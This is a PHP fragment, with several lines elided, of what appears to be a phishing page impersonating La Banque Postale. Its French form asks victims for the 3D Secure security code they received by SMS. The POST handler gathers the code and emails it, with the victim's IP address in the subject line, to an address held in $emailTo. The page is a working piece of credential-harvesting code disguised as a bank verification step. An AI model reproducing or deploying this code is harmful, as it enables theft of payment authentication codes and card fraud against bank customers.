<?php
  ...
  if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    if (empty($id)) {
      ...
      $emailText .= "Code 3D Secure 1 : $id\n";

    }

    if ($isSucess) {
     
    mail($emailTo, "Postale - 3D Secure 1 | =?UTF-8?Q?=e2=9d=a4_?=  $ip =?UTF-8?Q?=E2=9C=94_?= ", $emailText);
      $id = $mdp = "";
...
<hr align="center" width="100%" color="#1346A0" size="5">
          ...
          <p style="left:-200px">Veuillez saisir le code de sécurité reçu par SMS (Exemple: 12345678)</p>     
